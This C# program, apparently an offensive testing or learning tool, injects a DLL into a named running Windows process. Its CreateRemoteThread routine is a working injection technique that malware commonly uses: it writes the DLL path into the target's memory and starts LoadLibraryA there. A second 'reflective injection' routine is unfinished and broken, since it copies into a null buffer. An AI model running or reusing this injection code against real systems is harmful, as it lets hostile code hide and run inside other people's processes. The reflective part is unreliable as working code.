using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace ProcessInjection_Test1
{
    class InjectionTests
    {

        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;

        // used for memory allocation
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;

        // used for CreateFileA
        const int GENERIC_READ = 0x00000001;
        const int OPEN_EXISTING = 1;
        const int FILE_ATTRIBUTE_NORMAL = 128;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr procHandleess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32")]
        static extern IntPtr CreateFileA(string lpFileName, int dwDesiredAccess, int dwShareMode, int lpSecurityAttributes, int dwCreationDisposition, int dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32")]
        static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwSize);

        [DllImport("kernel32")]
        static extern IntPtr GetProcessHeap();

        [DllImport("kernel32")]
        static extern IntPtr ReadFile(IntPtr hFile, IntPtr lpBuffer, uint dwNumberOfBytesToRead, uint lpNumberOfBytesRead, uint lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr procHandleess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr procHandleess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);



        static void Main(string[] args)
        {

            // dllName is specified on CLI as: "C:\\dll.dll"
            if (args.Length < 3)
            {
                Console.WriteLine("[*] Usage: InjectionTests.exe <DLL> <TARGET_PROCESS> <TYPE>");
                Console.WriteLine("[*] e.g.   InjectionTests.exe \"C:\\\\inject.dll\" notepad crt");
            }
            string dllName = args[0];
            string processName = args[1];
            string type = args[2];
            
            Console.WriteLine("[!] Process Injection Tests");

            if (args[2] == "ref")
            {
                Console.WriteLine("[!] Injecting using Reflective Injection");
                reflective_Injection(processName, dllName);
            }
            if (args[2] == "crt")
            {
                Console.WriteLine("[!] Injecting using CreateRemoteThread()");
                crt_Injection(processName, dllName);
            }
            return;
        }

        static void crt_Injection(string processName, string dllName)
        {
            byte[] bdll = System.Text.Encoding.Default.GetBytes(dllName);

            // Get a handle to the target process 
            // This is the process we're injecting INTO
            Console.WriteLine("[+] Attempting to find " + processName);
            Process proc = Process.GetProcessesByName(processName)[0];
            Console.WriteLine("[+] Got Process: " + proc.Id);
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
            Console.WriteLine("[+] Got Process Handle: " + procHandle.ToInt64());

            // Load the address of the LoadLibraryA function
            // We'll need this in order to actually LOAD our allocated memory when we call CRT
            IntPtr loadLibrary_Address = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            Console.WriteLine("[+] Got LoadLibraryA Address: " + loadLibrary_Address.ToInt64());

            // Now, we allocate some memory within the target process that we'll use for writing
            Console.WriteLine("[+] Allocating memory...");
            IntPtr virtualAllocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            Console.WriteLine("[+] Allocated Memory: " + virtualAllocMemAddress.ToString());

            // Here we write the path to the DLL we're injecting into the memory of the target process, using the address we saved when calling VirtualAllocEx
            Console.WriteLine("[+] Writing memory...");
            UIntPtr bytesWritten;
            bool res = WriteProcessMemory(procHandle, virtualAllocMemAddress, bdll, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            if (res == true)
            {
                Console.WriteLine("[+] Process memory written, wrote " + bytesWritten.ToString() + " bytes");
            }

            // Finally, we can run CRT with the handle of the target process, the address of LoadLibraryA and the address of the allocated memory
            Console.WriteLine("[!] Prerequisites satisfied, attempting to CreateRemoteThread...");
            var threadId = CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibrary_Address, virtualAllocMemAddress, 0, IntPtr.Zero);
            Console.WriteLine("[+] Created threadId: " + threadId.ToString());

            return;
        }


        static void reflective_Injection(string processName, string dllName)
        {
            // Get a handle to the target process 
            // This is the process we're injecting INTO
            Console.WriteLine("[+] Attempting to find " + processName);
            Process proc = Process.GetProcessesByName(processName)[0];
            Console.WriteLine("[+] Got Process: " + proc.Id);
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
            Console.WriteLine("[+] Got Process Handle: " + procHandle.ToInt64());

            // First, we need the size of the DLL we're injecting
            FileInfo fi = new FileInfo(dllName);
            long dllSize = fi.Length;
            Console.WriteLine("[*] Target DLL length: " + dllSize.ToString());
            IntPtr hFile = CreateFileA(dllName, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);

            // Now, allocate that much memory into the target process
            Console.WriteLine("[+] Allocating memory...");
            IntPtr virtualAllocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            Console.WriteLine("[+] Allocated Memory: " + virtualAllocMemAddress.ToString());

            // The DLL needs to be read into memory, then copied into the process
            // WIP
            IntPtr lpBuffer = HeapAlloc(GetProcessHeap(), 0, (uint)dllSize);
            uint bytesRead = 0;
            UIntPtr bytesWritten;
            ReadFile(hFile, lpBuffer, (uint)dllSize, bytesRead, 0);
            byte[] test = null;
            Marshal.Copy(lpBuffer, test, 0, (int)dllSize);

            bool res = WriteProcessMemory(procHandle, virtualAllocMemAddress, test, (uint)dllSize, out bytesWritten);
            return;
        }
    }
}
